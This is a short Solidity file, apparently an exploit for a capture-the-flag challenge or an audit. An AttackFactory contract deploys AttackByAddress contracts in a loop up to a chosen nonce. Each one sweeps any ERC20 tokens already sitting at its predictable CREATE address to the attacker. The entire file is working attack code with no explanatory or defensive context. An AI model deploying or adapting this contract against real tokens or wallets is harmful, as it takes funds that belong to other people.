// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract AttackFactory {

    constructor(
        address token,
        uint256 nonce
    ) {
        for (uint256 index = 0; index <= nonce; index++) {
            new AttackByAddress(
                msg.sender,
                token
            );
        }
    }
}

contract AttackByAddress {
    constructor(
        address attacker,
        address token
    ) {
        uint balance = IERC20(token).balanceOf(address(this));

        if (balance > 0) {
            IERC20(token).transfer(attacker, balance);
        }
    }
}
